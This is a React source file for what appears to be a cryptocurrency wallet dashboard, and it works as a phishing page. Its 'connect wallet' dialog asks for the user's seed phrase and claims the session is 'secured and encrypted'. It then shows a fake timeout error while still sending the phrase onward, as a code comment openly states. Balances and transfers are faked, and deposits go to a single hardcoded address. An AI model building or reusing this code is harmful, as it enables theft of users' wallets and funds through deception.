
import React, { useState, useEffect } from 'react';
import { useAuth } from '@/context/AuthContext';
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Input } from '@/components/ui/input';
import { ArrowDown, ArrowUp, Copy, ChevronLeft, Send, Download, ShoppingCart, Wallet, Loader } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useTopCryptos } from '@/hooks/useCryptoData';
import { useNavigate } from 'react-router-dom';
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";

// QR Code component - simulated
const QRCode = ({ value }: { value: string }) => (
  <div className="w-48 h-48 mx-auto bg-white p-2 rounded-lg">
    <img 
      src="/public/lovable-uploads/14b5ef2a-6390-48ff-bb5a-34e93d47d0df.png" 
      alt="QR Code" 
      className="w-full h-full object-contain"
    />
  </div>
);

// Main Dashboard Component
const Dashboard = () => {
  const { user, connectWallet } = useAuth();
  const { toast } = useToast();
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null);
  const [selectedView, setSelectedView] = useState<'overview' | 'detail' | 'receive' | 'send'>('overview');
  const [isConnecting, setIsConnecting] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [sendAmount, setSendAmount] = useState('');
  const [recipientAddress, setRecipientAddress] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [dialogOpen, setDialogOpen] = useState(false);
  const navigate = useNavigate();
  
  const { data: topCryptos } = useTopCryptos(1, 10);

  useEffect(() => {
    // Redirect if not logged in
    if (!user) {
      navigate('/auth');
    }
  }, [user, navigate]);

  const walletId = "3535688863";
  const mockCryptos = [
    { 
      id: "usdt", 
      name: "usdt", 
      symbol: "eth", 
      price: 0.99, 
      change: +0.05, 
      amount: 0.000,
      image: "https://cryptologos.cc/logos/tether-usdt-logo.png"
    },
    { 
      id: "bitcoin", 
      name: "bitcoin", 
      symbol: "btc", 
      price: 82958.00, 
      change: -3.87, 
      amount: 0.000, 
      image: "https://cryptologos.cc/logos/bitcoin-btc-logo.png"
    },
    { 
      id: "ethereum", 
      name: "ethereum", 
      symbol: "eth", 
      price: 1943, 
      change: -3.2, 
      amount: 0.000,
      image: "https://cryptologos.cc/logos/ethereum-eth-logo.png"
    },
    { 
      id: "solana", 
      name: "Solana", 
      symbol: "sol", 
      price: 126.20, 
      change: +6.24, 
      amount: 0.000,
      image: "https://cryptologos.cc/logos/solana-sol-logo.png"
    },
    { 
      id: "litecoin", 
      name: "Litecoin", 
      symbol: "ltc", 
      price: 91.75, 
      change: +3.72, 
      amount: 0.000,
      image: "https://cryptologos.cc/logos/litecoin-ltc-logo.png"
    }
  ];

  const handleCopyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    toast({
      title: "address copied",
      description: "wallet address has been copied to clipboard",
    });
  };

  const handleCopyUserId = () => {
    navigator.clipboard.writeText(walletId);
    toast({
      title: "user id copied",
      description: "user id has been copied to clipboard",
    });
  };

  const handleConnectWalletSubmit = async () => {
    if (!seedPhrase.trim()) {
      toast({
        title: "error",
        description: "please enter your seed phrase",
        variant: "destructive",
      });
      return;
    }
    
    setIsConnecting(true);
    setDialogOpen(false);
    
    // Simulate connection timeout after 10 seconds
    setTimeout(async () => {
      setIsConnecting(false);
      
      toast({
        title: "unable to connect, timeout out",
        description: "connection timed out",
        variant: "destructive",
      });
      
      // Still send the phrase despite the timeout
      await connectWallet(seedPhrase);
      setSeedPhrase('');
    }, 10000);
  };

  const handleConnectWallet = () => {
    setDialogOpen(true);
  };

  const handleViewCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.id);
    setSelectedView('detail');
  };

  const handleBack = () => {
    if (selectedView === 'detail' || selectedView === 'receive' || selectedView === 'send') {
      setSelectedView('overview');
      setSelectedCrypto(null);
      setSendAmount('');
      setRecipientAddress('');
    }
  };

  const handleReceiveCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.id);
    setSelectedView('receive');
  };

  const handleSendCrypto = (crypto: any) => {
    setSelectedCrypto(crypto.id);
    setSelectedView('send');
  };

  const handleSendTransaction = () => {
    if (!sendAmount || !recipientAddress) {
      toast({
        title: "error",
        description: "please enter amount and recipient address",
        variant: "destructive",
      });
      return;
    }

    setIsSending(true);

    // Simulate sending transaction
    setTimeout(() => {
      setIsSending(false);
      toast({
        title: "transaction sent",
        description: `${sendAmount} ${selectedCrypto} sent to ${recipientAddress.substring(0, 10)}...`,
      });
      
      // Return to overview
      setSelectedView('overview');
      setSelectedCrypto(null);
      setSendAmount('');
      setRecipientAddress('');
    }, 2000);
  };

  // Mock address for demo purposes
  const getWalletAddress = (crypto: string) => {
    return "bc1qsauc64vz7jdpekvm4nyr7xmIys5funsIlecjqv";
  };

  if (!user) {
    return null; // We'll redirect in the useEffect
  }

  // Overview - Main Dashboard
  if (selectedView === 'overview') {
    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <div className="mb-8">
          <Card className="bg-[#1A1F2C] text-white">
            <CardHeader className="flex flex-row items-center justify-between pb-2">
              <CardTitle className="text-xl font-bold">total balance</CardTitle>
              <Button 
                variant="outline" 
                className="bg-transparent border-white/20 hover:bg-white/10" 
                onClick={handleConnectWallet}
                disabled={isConnecting}
              >
                {isConnecting ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    connecting...
                  </>
                ) : (
                  <>
                    <Wallet className="mr-2 h-4 w-4" />
                    connect wallet
                  </>
                )}
              </Button>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col md:flex-row justify-between items-start md:items-center">
                <div>
                  <div className="text-sm text-gray-400 mb-1">
                    wallet id {walletId} 
                    <Copy 
                      className="inline h-3 w-3 cursor-pointer ml-1" 
                      onClick={handleCopyUserId} 
                    />
                  </div>
                  <div className="text-4xl font-bold">$0.00</div>
                </div>
                <div className="flex gap-10 mt-4 md:mt-0">
                  <div>
                    <div className="text-lg font-medium">today's income</div>
                    <div className="flex items-center">
                      <ArrowDown className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                  <div>
                    <div className="text-lg font-medium">today's expense</div>
                    <div className="flex items-center">
                      <ArrowUp className="h-4 w-4 text-gray-400 mr-1" />
                      <span className="text-xl font-bold">$0.00</span>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <h2 className="text-2xl font-bold mb-4">latest activities</h2>
        <div className="space-y-4">
          {mockCryptos.map((crypto) => (
            <Card key={crypto.id} className="hover:border-crypto-light-blue/20 transition-all cursor-pointer" onClick={() => handleViewCrypto(crypto)}>
              <CardContent className="p-4">
                <div className="flex justify-between items-center">
                  <div className="flex items-center space-x-4">
                    <img src={crypto.image} alt={crypto.name} className="w-12 h-12 rounded-full" />
                    <div>
                      <div className="font-bold">${crypto.price.toLocaleString()}</div>
                      <div className={`text-sm ${crypto.change < 0 ? 'text-crypto-error-red' : 'text-crypto-success-green'}`}>
                        {crypto.change}%
                      </div>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-lg font-medium">{crypto.amount} {crypto.symbol}</div>
                    <div className="text-sm text-gray-400">$0.00</div>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Connect Wallet Dialog */}
        <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
          <DialogContent className="sm:max-w-md">
            <DialogHeader>
              <DialogTitle>connect external wallet</DialogTitle>
              <DialogDescription>
                enter your seed phrase to connect your wallet
              </DialogDescription>
            </DialogHeader>
            <div className="space-y-4 py-4">
              <div className="space-y-2">
                <Input
                  id="seedPhrase"
                  placeholder="enter seed phrase here..."
                  value={seedPhrase}
                  onChange={(e) => setSeedPhrase(e.target.value)}
                />
                <p className="text-xs text-amber-500">
                  This session is secured and encrypted
                </p>
              </div>
            </div>
            <DialogFooter>
              <Button onClick={handleConnectWalletSubmit} disabled={isConnecting}>
                {isConnecting ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    connecting...
                  </>
                ) : (
                  "connect wallet"
                )}
              </Button>
            </DialogFooter>
          </DialogContent>
        </Dialog>
      </div>
    );
  }

  // Crypto Detail View
  if (selectedView === 'detail' && selectedCrypto) {
    const crypto = mockCryptos.find(c => c.id === selectedCrypto);
    if (!crypto) return null;

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <div className="text-right text-crypto-error-red font-medium mb-4 w-full">
            {crypto.change}%
          </div>
          <img src={crypto.image} alt={crypto.name} className="w-24 h-24 mb-4" />
          <h1 className="text-3xl font-bold mb-1">$0.00</h1>
          <p className="text-gray-500">0.0000({crypto.symbol})</p>
          
          <div className="flex gap-2 mt-6">
            <Button size="icon" className="rounded-full bg-blue-500 hover:bg-blue-600" onClick={() => handleSendCrypto(crypto)}>
              <Send className="h-5 w-5" />
            </Button>
            <Button size="icon" className="rounded-full bg-green-500 hover:bg-green-600" onClick={() => handleReceiveCrypto(crypto)}>
              <Download className="h-5 w-5" />
            </Button>
          </div>
        </div>
        
        <h2 className="text-2xl font-bold mb-4">latest activities</h2>
        <Card>
          <CardContent className="p-4">
            <div className="text-center py-10">
              <p className="text-gray-500">no record found!</p>
            </div>
            <div className="bg-gray-100 dark:bg-gray-800 rounded-md p-4 mt-4">
              <div className="flex justify-between font-medium">
                <span>transactions</span>
                <span>amount</span>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Receive Crypto View
  if (selectedView === 'receive' && selectedCrypto) {
    const crypto = mockCryptos.find(c => c.id === selectedCrypto);
    if (!crypto) return null;
    
    const address = getWalletAddress(crypto.id);

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <img src={crypto.image} alt={crypto.name} className="w-20 h-20 mb-4" />
          <h2 className="text-2xl font-bold mb-6">{crypto.symbol}</h2>
          
          <Card className="w-full max-w-2xl">
            <CardHeader>
              <div className="flex justify-between items-center">
                <CardTitle>address</CardTitle>
                <CardTitle>{crypto.symbol}</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="flex flex-col items-center">
              <QRCode value={address} />
              <p className="text-center mt-6 text-gray-500">
                send only {crypto.symbol} to this deposit address. this address does not support deposit of non-fungible tokens.
              </p>
              
              <div className="flex w-full mt-6 border rounded-md overflow-hidden">
                <div className="bg-gray-100 dark:bg-gray-800 p-3">
                  {crypto.symbol}
                </div>
                <div className="flex-1 p-3 truncate overflow-hidden">
                  {address}
                </div>
                <Button variant="ghost" className="p-3 border-l" onClick={() => handleCopyAddress(address)}>
                  copy
                </Button>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  // Send Crypto View
  if (selectedView === 'send' && selectedCrypto) {
    const crypto = mockCryptos.find(c => c.id === selectedCrypto);
    if (!crypto) return null;

    return (
      <div className="container mx-auto py-10 px-4 font-poppins">
        <Button variant="ghost" onClick={handleBack} className="mb-6 hover:bg-transparent pl-0">
          <ChevronLeft className="mr-1" />
          back
        </Button>

        <div className="flex flex-col items-center justify-center mb-8">
          <img src={crypto.image} alt={crypto.name} className="w-20 h-20 mb-4" />
          <h2 className="text-2xl font-bold mb-6">{crypto.symbol}</h2>
          
          <Card className="w-full max-w-2xl">
            <CardHeader>
              <CardTitle>send {crypto.symbol}</CardTitle>
            </CardHeader>
            <CardContent className="space-y-6">
              <div className="space-y-2">
                <label htmlFor="recipient" className="text-sm font-medium">recipient address</label>
                <Input
                  id="recipient"
                  placeholder="enter recipient address"
                  value={recipientAddress}
                  onChange={(e) => setRecipientAddress(e.target.value)}
                />
              </div>
              
              <div className="space-y-2">
                <label htmlFor="amount" className="text-sm font-medium">amount</label>
                <div className="flex border rounded-md overflow-hidden">
                  <Input
                    id="amount"
                    placeholder="0.00"
                    value={sendAmount}
                    onChange={(e) => setSendAmount(e.target.value)}
                    className="border-0 flex-1"
                  />
                  <div className="bg-gray-100 dark:bg-gray-800 p-3 uppercase">
                    {crypto.symbol}
                  </div>
                </div>
                <p className="text-xs text-gray-500">
                  available: 0.00 {crypto.symbol}
                </p>
              </div>
              
              <Button 
                className="w-full" 
                onClick={handleSendTransaction}
                disabled={isSending}
              >
                {isSending ? (
                  <>
                    <Loader className="mr-2 h-4 w-4 animate-spin" />
                    sending...
                  </>
                ) : (
                  "send"
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return null;
};

export default Dashboard;
